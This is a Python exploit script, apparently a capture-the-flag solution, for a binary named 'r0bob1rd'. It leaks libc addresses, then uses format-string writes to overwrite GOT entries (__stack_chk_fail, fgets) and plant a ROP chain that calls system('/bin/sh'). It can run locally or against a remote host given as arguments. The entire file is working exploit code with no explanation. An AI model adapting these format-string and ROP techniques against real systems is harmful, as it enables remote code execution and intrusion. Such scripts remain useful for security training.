#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwncus import *

# context.log_level = 'debug'
exe = context.binary = ELF('./r0bob1rd_patched', checksec=False)
libc = exe.libc

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript='''

        b*operation+297
        b*main+72
        c
        '''.format(**locals()), *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

p = start()

# ==================== EXPLOIT ====================

def method1():
    sla(b'> ', b'-16')

    ru(b'chosen: ')
    puts = u64(rl()[:-1] + b'\0\0')
    libc.address = puts - 0x84420
    one_gadget = libc.address + 0xe3b01
    slog('Puts',puts)
    slog('Libc base', libc.address)
    slog('One gadget', one_gadget)

    offset = 8
    write = {
        exe.got["__stack_chk_fail"]: one_gadget
    }
    
    payload = fmtstr_payload(offset, write, write_size='short')
    payload = payload.ljust(106, b'.')
    sa(b'> ',payload)

def method2():

    offset = 8
    write = {
        exe.got["__stack_chk_fail"]: exe.sym["operation"]
    }
    
    payload = fmtstr_payload(offset, write, write_size='short')
    payload = payload.ljust(106, b".")
    sla(b">", b"10")
    sa(b">", payload)

    payload = f"hehe|%22$p|%45$p|".encode()
    payload = payload.ljust(106, b".")

    sa(b">", payload)
    ru(b"hehe|")
    leaks = rl().split(b"|")
    stack_leak = int(leaks[0], 16) 
    stack = stack_leak - 0x1a8
    libc.address = int(leaks[1], 16) - 0x24083
    slog("libc base", libc.address)
    slog("stack_leak", stack_leak)
    slog("stack", stack)

    write = {
        exe.got["fgets"]: libc.sym["gets"]
    }
    
    payload = fmtstr_payload(offset, write, write_size='short')
    payload = payload.ljust(106, b".")

    sa(b">", payload)

    sh = next(libc.search(b"/bin/sh\0"))
    system = libc.sym["system"]
    pop_rdi = 0x400cc3 # pop rdi; ret;
    ret = 0x040074e # ret;

    write = {
        stack: pop_rdi,
        stack + 8: sh,
        stack + 16: ret,
        stack + 24: system
    }

    payload = fmtstr_payload(offset, write, write_size='short')
    print(len(payload))
    sa(b">", payload)

    sl(b"alter")
    sl(b"alter")


def exploit():

    # method1()
    method2()

    interactive()

if __name__ == '__main__':
  exploit()
